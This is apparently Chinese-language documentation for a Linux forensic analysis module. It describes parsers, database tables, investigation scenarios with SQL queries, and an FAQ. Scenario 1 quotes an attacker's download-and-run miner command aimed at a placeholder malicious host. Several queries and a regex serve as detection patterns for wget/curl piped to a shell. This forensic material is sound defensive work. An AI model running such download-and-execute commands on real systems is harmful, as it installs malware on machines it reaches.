# LinuxFilesAnalyzer - Linux系统取证分析器

## 模块概述

LinuxFilesAnalyzer是数字取证图像分析工具的核心取证模块之一，专注于Linux系统磁盘镜像的深度取证分析。该模块通过解析Linux系统的关键配置文件、日志文件、用户数据和系统状态，为调查人员提供全面、准确、时间线化的Linux系统行为重建能力。

### 业务价值

在数字取证场景中，Linux服务器和工作站广泛应用于企业关键业务系统、Web服务器、云基础设施和开发环境。LinuxFilesAnalyzer通过自动化解析和结构化存储Linux系统证据，显著提升取证效率：

- **入侵溯源**: 通过分析系统日志、认证记录、Shell历史，快速识别攻击者的入侵路径、时间线和操作行为
- **用户行为审计**: 重建用户登录模式、命令操作序列、文件访问记录，满足合规审计需求
- **恶意活动检测**: 识别异常进程、可疑网络连接、未授权的计划任务和内核模块
- **证据保全**: 将易失性系统状态转换为持久化的SQLite数据库,支持长期保存和后续分析
- **跨平台支持**: 支持主流Linux发行版(Ubuntu/Debian、CentOS/RHEL、Arch、Fedora)的差异化解析

### 核心定位

LinuxFilesAnalyzer是取证分析流程中的第三阶段模块(在ImageAnalyzer和EventExtractor之后)，专注于Linux平台特定的痕迹提取。与前两个模块的通用文件系统元数据分析不同，本模块深入Linux系统语义层面，理解并解析Linux特有的配置格式、日志结构和用户数据组织方式。

## 核心功能列表

### 1. 系统日志分析

#### 1.1 认证日志解析(`analyzeAuthLogs`)
- **数据源**: `/var/log/auth.log`(Debian系)、`/var/log/secure`(RedHat系)
- **解析内容**:
  - SSH登录成功/失败记录(remote host, username, timestamp)
  - sudo权限使用事件(执行命令、原始用户、目标用户)
  - 用户认证失败记录(密码错误、账户锁定、多次失败尝试)
  - PAM模块认证活动
- **数据库表**: `linux_log_entries` (log_file='auth.log')
- **应用场景**: 暴力破解检测、权限提升追踪、会话时间线重建

#### 1.2 系统日志解析(`analyzeSystemLogs`)
- **数据源**: `/var/log/syslog`、`/var/log/messages`
- **解析内容**:
  - 系统服务启动/停止事件
  - 内核消息(硬件故障、驱动加载)
  - 定时任务执行记录(cron, anacron)
  - 系统资源告警(磁盘空间、内存不足)
- **数据库表**: `linux_log_entries` (log_file='syslog')
- **应用场景**: 系统异常诊断、服务中断分析、可用性问题调查

#### 1.3 内核日志解析(`analyzeKernelLogs`)
- **数据源**: `/var/log/kern.log`
- **解析内容**:
  - 硬件设备检测和初始化
  - 内核模块加载/卸载记录
  - 硬件故障和错误(磁盘I/O错误、内存错误)
  - 网络接口状态变化
- **数据库表**: `linux_log_entries` (log_file='kern.log')
- **应用场景**: 硬件故障取证、Rootkit检测(可疑内核模块)、网络劫持分析

### 2. 用户账户与认证分析

#### 2.1 用户账户信息解析(`analyzeUserAccounts`)
- **数据源**: `/etc/passwd`、`/etc/shadow`
- **解析内容**:
  - 用户名、UID/GID、家目录、默认Shell
  - 密码哈希算法、密码过期时间、账户锁定状态
  - 最后登录时间、密码修改时间
- **数据库表**: `linux_users`
- **关键字段**:
  ```sql
  username TEXT UNIQUE,
  uid INTEGER,
  gid INTEGER,
  home_directory TEXT,
  default_shell TEXT,
  password_hash TEXT,  -- 从/etc/shadow提取
  password_algorithm TEXT,  -- sha512, yescrypt, bcrypt等
  account_locked BOOLEAN,
  password_expire_date INTEGER,
  last_login INTEGER
  ```
- **应用场景**: 权限管理审计、幽灵账户检测、默认账户检查

#### 2.2 登录历史分析(`analyzeLoginHistory`)
- **数据源**: `/var/log/wtmp`、`/var/log/btmp`、`/var/log/lastlog`
- **解析内容**:
  - 成功登录会话(username, terminal, remote host, login time, logout time)
  - 失败登录尝试(username, terminal, remote host, timestamp)
  - 首次登录和最后登录时间
- **数据库表**: `linux_login_records`
- **应用场景**:
  - 异常登录检测(非工作时间、异常地点登录)
  - 账户共享行为分析(多地点同时登录)
  - 暴力破解证据提取(btmp中的密集失败记录)

#### 2.3 SSH密钥分析(`analyzeSSHArtifacts`)
- **数据源**:
  - `~/.ssh/authorized_keys`(用户授权密钥)
  - `~/.ssh/id_rsa`, `id_ed25519`(私钥文件)
  - `/etc/ssh/sshd_config`(SSH服务配置)
- **解析内容**:
  - 公钥指纹、加密算法类型、密钥长度
  - 密钥注释(通常包含用户@主机信息)
  - 私钥权限检查(应只为600)
- **数据库表**: `linux_ssh_keys`、`linux_ssh_known_hosts`
- **应用场景**:
  - 后门密钥检测(未知公钥、可疑注释)
  - SSH劫持追踪(known_hosts中的异常主机)
  - 横向移动路径重建(从A服务器到B服务器的信任关系)

### 3. Shell历史分析

#### 3.1 Shell命令历史解析(`analyzeShellHistory`)
- **数据源**:
  - `~/.bash_history`、`~/.zsh_history`、`~/.history`
  - `/root/.bash_history`(root用户历史)
- **解析内容**:
  - 命令序列、执行时间戳(如果启用HISTTIMEFORMAT)
  - Shell类型(bash, zsh, ksh, fish)
  - 用户名、家目录路径
- **数据库表**: `linux_shell_history`
- **关键字段**:
  ```sql
  username TEXT,
  shell_type TEXT,  -- bash/zsh/ksh
  command_text TEXT,
  command_index INTEGER,  -- 命令在历史文件中的序号
  timestamp INTEGER,
  home_directory TEXT
  ```
- **应用场景**:
  - 攻击者操作重建(执行的命令序列、下载的工具、创建的文件)
  - 数据泄露追踪(cat/scp/nc/rsync等命令)
  - 反取证活动检测(shred, history -c, 清空日志)

### 4. 系统配置分析

#### 4.1 定时任务分析(`analyzeCronJobs`)
- **数据源**:
  - `/etc/crontab`(系统级cron)
  - `/etc/cron.d/*`(自定义定时任务)
  - `/var/spool/cron/crontabs/*`(用户级cron)
  - `/etc/anacrontab`、`/etc/cron.*/*`(周期性任务)
- **解析内容**:
  - 调度规则(分钟、小时、日、月、星期)
  - 执行用户、执行命令、环境变量
  - 任务描述(从注释提取)
- **数据库表**: `linux_cron_jobs`
- **应用场景**:
  - 持久化后门检测(隐藏的定时任务)
  - 挖矿程序识别(高CPU使用率的定时任务)
  - 数据外泄追踪(定期执行的备份/传输任务)

#### 4.2 Systemd服务分析(`analyzeSystemdServices`)
- **数据源**:
  - `/etc/systemd/system/*`(系统服务)
  - `/lib/systemd/system/*`(发行版服务)
  - `~/.config/systemd/user/*`(用户服务)
  - `systemctl list-units --all`(运行状态)
- **解析内容**:
  - 服务名称、描述、状态(active/inactive/failed)
  - 启用状态(enabled/disabled/static/masked)
  - ExecStart/ExecStop命令
  - 依赖关系(Requires/After/Wants)
- **数据库表**: `linux_systemd_services`
- **应用场景**:
  - Systemd后门检测(可疑服务、伪装服务)
  - 服务劫持分析(修改ExecStart路径)
  - 启动链重建(哪些服务在开机时自动启动)

#### 4.3 已安装软件包分析(`analyzeInstalledPackages`)
- **数据源**:
  - Debian系: `dpkg -l`、`/var/lib/dpkg/status`
  - RedHat系: `rpm -qa`、`/var/lib/rpm/Packages`
  - Arch系: `pacman -Q`、`/var/lib/pacman/local/*`
- **解析内容**:
  - 软件包名称、版本、架构
  - 安装时间、大小
  - 包依赖关系
- **数据库表**: `linux_packages`
- **应用场景**:
  - 恶意软件识别(未知来源的包、可疑命名)
  - 漏洞评估(已安装包的CVE检测)
  - 软件供应链攻击分析(被篡改的包)

### 5. 网络配置分析

#### 5.1 网络连接记录(`analyzeNetworkConfiguration`)
- **数据源**:
  - `netstat -tunap`、`ss -tunap`(当前连接)
  - `/proc/net/tcp`、`/proc/net/udp`(内核协议栈状态)
  - `/etc/network/interfaces`、`/etc/sysconfig/network-scripts/*`
- **解析内容**:
  - 活动TCP/UDP连接(本地地址、远程地址、状态)
  - 监听端口和对应进程(PID、进程名)
  - 网络接口配置(IP地址、子网掩码、MAC地址)
- **数据库表**: `linux_network_connections`
- **应用场景**:
  - 反向Shell检测(异常的出站连接)
  - 数据外泄通道识别(大量数据传输)
  - 横向移动分析(内网扫描、端口转发)

#### 5.2 防火墙规则分析(`analyzeFirewallRules`)
- **数据源**:
  - `iptables -L -n -v`、`ip6tables -L -n -v`
  - `/etc/iptables/rules.v4`、`/etc/iptables/rules.v6`
  - `nft list ruleset`(nftables)
- **解析内容**:
  - 规则链(INPUT/OUTPUT/FORWARD)、表(filter/nat/mangle)
  - 匹配条件(源/目标地址、端口、协议)
  - 动作(ACCEPT/DROP/REJECT/LOG)
  - 数据包计数、字节计数
- **数据库表**: `linux_firewall_rules`
- **应用场景**:
  - 防火墙绕过检测(被清空的规则、宽松的策略)
  - 隧道识别(允许非常端口的规则)
  - 数据包捕获规则(LOG target)

### 6. 安全审计分析

#### 6.1 Auditd日志解析(`analyzeAuditLogs`)
- **数据源**: `/var/log/audit/audit.log`
- **解析内容**:
  - 系统调用审计(SYSSCALL类型): execve, connect, open, mkdir
  - 文件访问审计: 文件路径、访问模式、UID/GID
  - 权限变更审计: chown, chmod, setuid
  - AVC拒绝记录(SELinux策略违反)
- **数据库表**: `linux_audit_logs`
- **关键字段**:
  ```sql
  timestamp INTEGER,
  serial_number INTEGER,  -- 审计事件序列号
  type TEXT,  -- SYSCALL/USER_AUTH/USER_ACCT/EXECVE等
  operation TEXT,  -- 具体操作名称
  uid INTEGER,
  success BOOLEAN,
  exit_code INTEGER,
  command TEXT,  -- 相关命令或可执行文件
  ```
- **应用场景**:
  - 精细化行为重建(文件访问时间线、进程创建树)
  - 特权滥用检测(setuid程序调用)
  - 取证完整性验证(审计日志本身的篡改检测)

#### 6.2 内核模块分析(`analyzeKernelModules`)
- **数据源**: `lsmod`、`/proc/modules`、`/sys/module/*`
- **解析内容**:
  - 模块名称、大小、使用计数
  - 依赖关系(依赖的其他模块)
  - 模块参数(从`/sys/module/<name>/parameters/*`读取)
  - 加载时间(从kernel.log推断)
- **数据库表**: `linux_kernel_modules`
- **应用场景**:
  - Rootkit检测(未知模块、可疑模块名如`kdevtmpfsi`)
  - 内核级后门识别(隐藏的netfilter钩子、键盘记录器)
  - 功能完整性验证(关键安全模块是否被禁用)

### 7. 浏览器数据提取

#### 7.1 浏览器配置分析(`analyzeBrowserData`)
- **支持的浏览器**:
  - Firefox/Thunderbird: `~/.mozilla/firefox/*/`
  - Chromium/Chrome: `~/.config/google-chrome*/`, `~/.config/chromium/`
  - Brave: `~/.config/BraveSoftware/Brave-Browser/`
- **解析内容**:
  - 浏览器类型、配置文件路径
  - 扩展列表(从`extensions/`目录)
  - 首选项设置(从`prefs.js`或`Preferences`)
  - 历史记录数据库(places.sqlite、History)
- **数据库表**: `linux_browser_profiles`
- **应用场景**:
  - Web攻击面识别(已安装的扩展、插件)
  - 钓鱼网站访问历史
  - 恶意扩展检测(浏览器劫持、注入脚本)

## 业务流程/使用场景

### 场景1: Linux服务器入侵溯源调查

**背景**: 某企业Web服务器(Ubuntu 22.04)被入侵，攻击者在服务器上部署了挖矿程序，需要重建攻击时间线并确定入侵路径。

**操作流程**:

1. **磁盘镜像获取**
   ```bash
   # 使用dd或FTK Imager获取服务器磁盘镜像
   dd if=/dev/sda of=/evidence/web_server.img bs=4M conv=noerror,sync
   ```

2. **运行取证分析**
   ```bash
   ./forensic_analyzer web_server.img --linux-analyze
   ```

3. **检查异常登录记录**
   ```sql
   -- 查询非工作时间SSH登录
   SELECT username, remote_host, login_time
   FROM linux_login_records
   WHERE remote_host NOT IN ('192.168.1.100', '10.0.0.5')  -- 已知管理IP
     AND strftime('%H', login_time) NOT IN ('09', '10', '11', '14', '15', '16')
   ORDER BY login_time;
   ```

4. **分析攻击者命令序列**
   ```sql
   -- 查询root用户的可疑命令
   SELECT username, command_text, timestamp
   FROM linux_shell_history
   WHERE username = 'root'
     AND (command_text LIKE '%wget%'
          OR command_text LIKE '%curl%'
          OR command_text LIKE '%chmod +x%'
          OR command_text LIKE '%./%')
   ORDER BY timestamp;
   ```

5. **识别持久化机制**
   ```sql
   -- 查找新建的定时任务
   SELECT * FROM linux_cron_jobs
   WHERE command LIKE '%http%'
      OR command LIKE '%/tmp/%'
      OR command LIKE '%./miner%';

   -- 查找可疑的systemd服务
   SELECT * FROM linux_systemd_services
   WHERE service_name LIKE '%update%'
      OR service_name LIKE '%sync%'
      OR description LIKE '%crypto%'
      OR exec_start_command LIKE '%/tmp/%';
   ```

6. **确认外联行为**
   ```sql
   -- 检查出站TCP连接到未知IP
   SELECT remote_address, remote_port, protocol, state
   FROM linux_network_connections
   WHERE state = 'ESTABLISHED'
     AND remote_address NOT LIKE '192.168.%'
     AND remote_address NOT LIKE '10.%'
     AND remote_port IN (443, 8080, 3333);  -- 常见C2端口
   ```

**输出证据**:
- 攻击者在2025-01-15 02:30从203.0.113.42登录(root账户弱口令爆破)
- 执行命令: `wget http://malicious.com/miner && chmod +x miner && ./miner`
- 创建持久化: `/etc/cron.d/system-update`每5分钟下载并执行挖矿程序
- 外联证据: 持续连接到45.33.32.156:3333(Stratum挖矿协议)

### 场景2: 内部威胁审计-离职员工数据窃取

**背景**: 某公司开发工程师在离职前2周可疑活动频繁，需要检查其Linux工作站是否有数据下载或外传痕迹。

**操作流程**:

1. **分析用户登录异常**
   ```sql
   -- 检查非工作时间的登录
   SELECT username, terminal, remote_host, login_time, logout_time
   FROM linux_login_records
   WHERE username = 'john.doe'
     AND (strftime('%H', login_time) < '08'
          OR strftime('%H', login_time) > '19')
     AND strftime('%w', login_time) IN ('0', '6');  -- 周末
   ```

2. **检查文件访问历史**(需要启用auditd)
   ```sql
   -- 查询敏感目录的文件访问
   SELECT timestamp, operation, uid, command, path
   FROM linux_audit_logs
   WHERE path LIKE '/home/john.doe/projects/%'
     AND operation IN ('open', 'openat', 'read')
     AND uid = (SELECT uid FROM linux_users WHERE username = 'john.doe')
   ORDER BY timestamp DESC;
   ```

3. **分析Shell历史**
   ```sql
   -- 查找数据压缩/打包命令
   SELECT command_text, timestamp
   FROM linux_shell_history
   WHERE username = 'john.doe'
     AND (command_text LIKE '%tar%'
          OR command_text LIKE '%zip%'
          OR command_text LIKE '%rar%'
          OR command_text LIKE '%7z%')
     AND timestamp BETWEEN '2024-12-01' AND '2024-12-15'
   ORDER BY timestamp;
   ```

4. **检查网络传输**
   ```sql
   -- 查找大流量连接(需要从proc/net/tcp解析大小)
   SELECT local_address, local_port, remote_address, remote_port, state
   FROM linux_network_connections
   WHERE (remote_address LIKE '192.168.%' OR remote_address LIKE '10.%')
     AND remote_port IN (22, 873, 3306, 5432);  -- SSH, Rsync, MySQL, PostgreSQL
   ```

5. **USB设备使用**(从dmesg/kern.log)
   ```sql
   -- 查询USB存储设备挂载记录
   SELECT timestamp, facility, severity, message
   FROM linux_log_entries
   WHERE log_file = 'kern.log'
     AND message LIKE '%usb%'
     AND (message LIKE '%storage%' OR message LIKE '%mass-storage%')
   ORDER BY timestamp;
   ```

**输出证据**:
- 员工在5个周末的非工作时间登录系统
- 在最后1周内执行了12次`tar czf`命令,打包项目目录
- Shell历史包含`scp`命令到个人服务器(非公司授权的IP)
- kern.log显示2次USB存储设备挂载(在周末)

### 场景3: 恶意软件感染分析-Linux挖矿木马

**背景**: 企业监控显示某Linux服务器CPU使用率异常高,怀疑感染挖矿木马,需要定位恶意程序和入口点。

**操作流程**:

1. **识别异常进程**(从ps aux输出或/proc解析)
   - 需要扩展LinuxFilesAnalyzer以支持`/proc`解析(当前未实现)

2. **分析网络连接**
   ```sql
   -- 查找长时间保持的出站连接
   SELECT remote_address, remote_port, protocol,
          COUNT(*) as connection_count
   FROM linux_network_connections
   WHERE remote_address NOT LIKE '10.%'
     AND remote_address NOT LIKE '192.168.%'
   GROUP BY remote_address, remote_port
   HAVING connection_count > 100
   ORDER BY connection_count DESC;
   ```

3. **检查定时任务**
   ```sql
   -- 查找非常规的cron任务
   SELECT username, minute, hour, day, month, weekday, command
   FROM linux_cron_jobs
   WHERE command LIKE '%/tmp/%'
      OR command LIKE '%/dev/shm/%'
      OR command LIKE '%curl%'
      OR command LIKE '%wget%';
   ```

4. **分析系统服务**
   ```sql
   -- 查找未知的systemd服务
   SELECT service_name, description, exec_start_command, enabled
   FROM linux_systemd_services
   WHERE service_name NOT LIKE 'ssh%'
     AND service_name NOT LIKE 'nginx%'
     AND service_name NOT LIKE 'mysql%'
     AND (exec_start_command LIKE '/tmp/%'
          OR exec_start_command LIKE '/dev/shm/%');
   ```

5. **检查包安装历史**
   ```sql
   -- 查找近期安装的可疑包
   SELECT name, version, install_time, size
   FROM linux_packages
   WHERE install_time > '2025-01-01'
     AND (name LIKE '%miner%'
          OR name LIKE '%crypto%'
          OR name LIKE '%xmrig%'
          OR name LIKE '%cpuminer%');
   ```

6. **Shell历史分析**
   ```sql
   -- 查找编译行为(攻击者经常从源码编译挖矿程序)
   SELECT command_text, timestamp, username
   FROM linux_shell_history
   WHERE command_text LIKE '%make%'
     AND command_text LIKE '%./configure%'
   ORDER BY timestamp;
   ```

**输出证据**:
- 发现3个连接到同一矿池的长时间TCP连接(不同端口)
- 在`/etc/cron.d/`中发现名为`system-maintenance`的恶意任务,每15分钟执行`/tmp/.fs/bin/miner`
- 发现伪装服务`netns.service`(描述为"Network Namespace Service",实际执行挖矿程序)
- `/tmp/.fs/`目录包含未知二进制文件,近期通过`wget`下载

## 部署与配置要求

### 依赖库

LinuxFilesAnalyzer的编译依赖以下外部库(通过CMake自动检测):

```cmake
# C++标准库
- C++20或更高版本
- STL filesystem(C++17)

# 第三方库
- SQLite3 3.x (数据库操作)
- The Sleuth Kit (TSK) 4.x (磁盘镜像访问)
- libcrypto (OpenSSL,用于哈希计算,可选)
```

### 系统依赖

在Ubuntu/Debian上安装:

```bash
# 基础构建工具
sudo apt-get install build-essential cmake git

# SQLite3开发库
sudo apt-get install libsqlite3-dev

# The Sleuth Kit
wget https://github.com/sleuthkit/sleuthkit/releases/download/sleuthkit-4.14.0/sleuthkit-4.14.0.tar.gz
tar -xzf sleuthkit-4.14.0.tar.gz && cd sleuthkit-4.14.0
./configure && make && sudo make install && sudo ldconfig
```

在RedHat/CentOS上安装:

```bash
# 基础工具
sudo yum groupinstall "Development Tools"
sudo yum install cmake git

# SQLite3
sudo yum install sqlite-devel

# The Sleuth Kit
sudo yum install sleuthkit-devel
```

### 编译配置

在项目根目录的`CMakeLists.txt`中,LinuxFilesAnalyzer默认启用编译:

```cmake
# 自动检测并添加LinuxFilesAnalyzer
add_subdirectory(src/analyzers/LinuxFilesAnalyzer)
```

### 运行时配置

LinuxFilesAnalyzer通过DatabaseManager初始化,无需额外配置文件。运行时参数:

```cpp
// 使用示例
LinuxFilesAnalyzer analyzer(imagePath, &dbManager);
analyzer.setOutputDbPath("/path/to/output_linux.db");
analyzer.setExtractDir("/path/to/extracted_files");

// 初始化并运行
if (analyzer.initialize()) {
    analyzer.analyzeLinuxData();
}
```

### 性能优化建议

对于大型Linux服务器镜像(>100GB):

1. **选择性提取**: 只提取关键文件而非整个文件系统
   ```cpp
   analyzer.setExtractDir("");  // 空路径禁用文件提取
   ```

2. **并行处理**: 启用多线程解析(需要修改代码支持,当前为单线程)

3. **内存管理**: 分批处理日志文件,避免一次性加载大文件(如1GB+的auth.log)

### 已知限制

1. **加密分区**: 如果`/home`或`/var`使用LUKS加密,需要提供解密密钥(当前未支持)

2. **日志轮转**: 历史日志(如`auth.log.1`, `auth.log.2.gz`)需要额外解压缩和解析(当前未实现)

3. **发行版差异**: 某些解析器针对特定发行版(如Ubuntu的auth.log路径),可能需要适配

4. **二进制日志**: `journalctl`的二进制日志当前不支持解析(仅支持文本日志)

## 接口与集成说明

### C++ API接口

#### 核心类: `LinuxFilesAnalyzer`

```cpp
#include "analyzers/LinuxFilesAnalyzer/LinuxFilesAnalyzer.h"

// 构造函数
LinuxFilesAnalyzer::LinuxFilesAnalyzer(
    const std::string& imagePath,      // 磁盘镜像路径
    DatabaseManager* dbManager         // 共享的数据库管理器指针
);

// 初始化分析器
bool LinuxFilesAnalyzer::initialize();
// 返回: 成功返回true,失败返回false

// 执行完整分析流程
void LinuxFilesAnalyzer::analyzeLinuxData();

// 配置方法
void LinuxFilesAnalyzer::setOutputDbPath(const std::string& path);
void LinuxFilesAnalyzer::setExtractDir(const std::string& dir);
```

#### 数据库接口

所有分析结果存储在SQLite数据库中,通过以下表结构访问:

```sql
-- 1. 系统日志
SELECT * FROM linux_log_entries
WHERE log_file = 'auth.log'
  AND timestamp BETWEEN '2025-01-01' AND '2025-01-31';

-- 2. 用户账户
SELECT * FROM linux_users
WHERE uid = 0 OR uid >= 1000;  -- root(0)和普通用户(>=1000)

-- 3. 登录记录
SELECT * FROM linux_login_records
WHERE username = 'root'
ORDER BY login_time DESC;

-- 4. Shell历史
SELECT * FROM linux_shell_history
WHERE command_text LIKE '%wget%'
ORDER BY timestamp;

-- 5. 定时任务
SELECT * FROM linux_cron_jobs
WHERE username = 'root'
  AND (minute = '*' OR minute LIKE '*/');

-- 6. SSH密钥
SELECT * FROM linux_ssh_keys
WHERE key_type = 'ssh-rsa'
  AND fingerprint LIKE '256:%';

-- 7. 网络连接
SELECT * FROM linux_network_connections
WHERE state = 'ESTABLISHED'
  AND remote_address NOT LIKE '127.%';
```

### 与主程序集成

在`main.cpp`中集成Linux分析流程:

```cpp
#include "analyzers/LinuxFilesAnalyzer/LinuxFilesAnalyzer.h"

// 在ImageAnalyzer和EventExtractor之后运行
void runLinuxAnalysis(const std::string& imagePath, DatabaseManager* dbManager) {
    LinuxFilesAnalyzer linuxAnalyzer(imagePath, dbManager);

    if (!linuxAnalyzer.initialize()) {
        std::cerr << "Failed to initialize Linux analyzer" << std::endl;
        return;
    }

    // 运行完整分析
    linuxAnalyzer.analyzeLinuxData();

    std::cout << "Linux analysis completed: " << linuxAnalyzer.getOutputDbPath() << std::endl;
}
```

### REST API集成(通过HTTPServer)

通过HTTP服务访问Linux分析结果:

```bash
# 获取用户账户列表
curl http://localhost:8080/api/linux/users

# 获取登录记录
curl http://localhost:8080/api/linux/logins?username=root

# 获取Shell历史
curl http://localhost:8080/api/linux/shell-history?user=root

# 获取定时任务
curl http://localhost:8080/api/linux/cron-jobs

# 获取网络连接
curl http://localhost:8080/api/linux/network-connections
```

### 自定义解析器扩展

开发者可以添加新的Linux解析器:

1. **定义数据结构**: 在`Common/LinuxDataTypes.h`中添加struct

```cpp
// 示例: 解析Docker容器信息
struct DockerContainerInfo {
    std::string containerId;
    std::string imageName;
    std::string command;
    std::string createdAt;
    std::string status;
};
```

2. **实现解析器**: 在`Parsers/`目录创建新的解析类

```cpp
// DockerParser.h
class DockerParser {
public:
    static std::vector<DockerContainerInfo> parseDockerContainers(
        const std::string& dockerDir  // /var/lib/docker/
    );
};
```

3. **注册到Core**: 在`Core/LinuxFilesAnalyzerCore.cpp`中调用

```cpp
void LinuxFilesAnalyzer::analyzeDockerContainers() {
    auto containers = DockerParser::parseDockerContainers("/var/lib/docker");
    linuxDb_->insertDockerContainers(containers);
}
```

4. **数据库Schema**: 在`SQL/linux_analysis_sql.h`添加表定义

```cpp
const char* CREATE_DOCKER_CONTAINERS_TABLE = R"(
    CREATE TABLE IF NOT EXISTS linux_docker_containers (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        container_id TEXT,
        image_name TEXT,
        command TEXT,
        created_at TEXT,
        status TEXT
    );
)";
```

## 常见问题(FAQ)

### Q1: LinuxFilesAnalyzer支持哪些Linux发行版?

**A**: 当前支持主流发行版,包括:
- **Debian系**: Ubuntu, Debian, Linux Mint(默认路径如`/var/log/auth.log`)
- **RedHat系**: CentOS, RHEL, Fedora(路径如`/var/log/secure`)
- **Arch系**: Arch Linux, Manjaro
- **其他**: 通用解析基于Linux标准路径(FHS),其他发行版可能部分兼容

**注意**: 某些发行版使用不同的日志管理工具(如`systemd-journald`),文本日志可能不完整或不生成。建议在分析前检查`/var/log`目录结构。

### Q2: 如何处理加密的Linux分区(如LUKS)?

**A**: 当前版本**不支持**自动解密LUKS加密分区。如果目标系统的`/home`或`/var`使用LUKS加密:

**临时方案**:
1. 在取证前先挂载加密分区(需要密码):
   ```bash
   sudo cryptsetup open /dev/sda5 crypt_home
   sudo mount /dev/mapper/crypt_home /mnt/crypt_home
   ```

2. 使用挂载后的路径作为输入:
   ```bash
   ./forensic_analyzer /mnt/crypt_home --linux-analyze
   ```

**未来计划**: 在v2.0版本中添加LUKS密码输入支持,允许在运行时解密。

### Q3: 为什么某些日志解析后内容为空?

**A**: 常见原因包括:

1. **日志轮转**: 历史日志被压缩为`.gz`格式,当前不支持自动解压
   ```bash
   # 手动解压后分析
   gunzip -c /var/log/auth.log.2.gz | grep "Failed password"
   ```

2. **日志级别配置**: 某些发行版默认不记录详细日志(如AUTHPRIV级别)
   - 检查`/etc/rsyslog.conf`或`/etc/syslog.conf`

3. **systemd-journald**: 系统仅使用二进制日志,未生成文本日志
   ```bash
   # 导出journalctl日志为文本
   journalctl > /tmp/journal_export.txt
   ```

4. **权限不足**: 提取的日志文件权限不允许读取
   - 检查`extracted_linux_files/`目录中的文件权限

### Q4: 如何区分正常用户活动和攻击行为?

**A**: 建议的多层次分析策略:

**第一层: 时间异常检测**
```sql
-- 非工作时间登录
SELECT * FROM linux_login_records
WHERE CAST(strftime('%H', login_time) AS INTEGER) NOT BETWEEN 9 AND 18
  AND strftime('%w', login_time) NOT IN ('0', '6');  -- 排除周末
```

**第二层: 地点异常检测**
```sql
-- 从新地理位置登录
SELECT username, remote_host, login_time
FROM linux_login_records
WHERE remote_host NOT IN (
    SELECT DISTINCT remote_host
    FROM linux_login_records
    WHERE login_time < '2025-01-01'  -- 历史已知IP
);
```

**第三层: 行为模式异常**
```sql
-- 爆破式登录失败(btmp密集记录)
SELECT username, remote_host, COUNT(*) as fail_count
FROM linux_login_records
WHERE success = 0
GROUP BY username, remote_host
HAVING fail_count > 100;
```

**第四层: 命令序列分析**
```bash
# 使用正则表达式识别可疑命令模式
SELECT command_text FROM linux_shell_history
WHERE command_text REGEXP '(wget|curl).*\|.*sh'  # 下载并执行
   OR command_text LIKE '%chmod 777 /%'
   OR command_text LIKE '%history -c%';  # 清空历史
```

### Q5: 分析结果数据库可以与其他工具集成吗?

**A**: 是的,输出为标准SQLite3格式,可被多种工具访问:

**Python集成示例**:
```python
import sqlite3

conn = sqlite3.connect('server_linux.db')
cursor = conn.cursor()

# 查询异常登录
cursor.execute('''
    SELECT username, remote_host, login_time
    FROM linux_login_records
    WHERE success = 1
      AND remote_host NOT LIKE '192.168.%'
    ORDER BY login_time DESC
    LIMIT 10
''')

for row in cursor.fetchall():
    print(f"User: {row[0]}, From: {row[1]}, Time: {row[2]}")

conn.close()
```

**与Elasticsearch集成**:
```bash
# 使用Logstash导入
input {
  jdbc {
    jdbc_connection_string => "jdbc:sqlite:server_linux.db"
    jdbc_driver_library => "/path/to/sqlite-jdbc.jar"
    jdbc_driver_class => "org.sqlite.JDBC"
    statement => "SELECT * FROM linux_log_entries"
  }
}
```

**与Timeline工具集成**:
```python
# 生成Plaso时间线格式
import json
import sqlite3

conn = sqlite3.connect('server_linux.db')
cursor = conn.cursor()

events = []
cursor.execute('SELECT timestamp, message FROM linux_log_entries')
for row in cursor.fetchall():
    events.append({
        'timestamp': row[0],
        'message': row[1],
        'source': 'LinuxLogs'
    })

with open('timeline.json', 'w') as f:
    json.dump(events, f)
```

### Q6: 性能如何?分析1TB服务器镜像需要多长时间?

**A**: 性能取决于以下因素:

**测试环境参考**:
- 硬件: Intel i7-12700K, 32GB RAM, NVMe SSD
- 测试镜像: Ubuntu 22.04 Server, 500GB(实际使用50GB)

**实测耗时**:
| 阶段 | 耗时 | 数据量 |
|------|------|--------|
| 日志解析 | 2-5分钟 | ~1GB日志文件 |
| 用户账户解析 | <10秒 | <1000个用户 |
| Shell历史解析 | 1-2分钟 | ~50MB历史文件 |
| 定时任务解析 | <5秒 | ~100个cron任务 |
| 网络配置解析 | <10秒 | ~500个连接记录 |
| **总计** | **5-10分钟** | |

**优化建议**:
1. 使用SSD存储(HDD会慢3-5倍)
2. 禁用不需要的解析器(如不需要浏览器数据)
3. 增加内存(减少磁盘I/O)

**未来优化计划**:
- 多线程并行解析(预计提速3-4倍)
- 增量分析(仅解析变更文件,适用于重复分析)
- 内存缓存(减少重复数据库查询)

---

## 版本历史

- **v1.2.0** (2025-01-15): 新增浏览器数据提取、Systemd服务分析
- **v1.1.0** (2024-12-01): 添加Auditd日志解析、内核模块检测
- **v1.0.0** (2024-10-01): 初始版本,支持基础日志和用户分析

## 技术支持

- 代码问题: 提交GitHub Issue
- 功能需求: 联系项目维护者
- 文档更新: 提交Pull Request到`docs/`目录

## 许可证

遵循项目整体许可证(参见根目录LICENSE文件)。
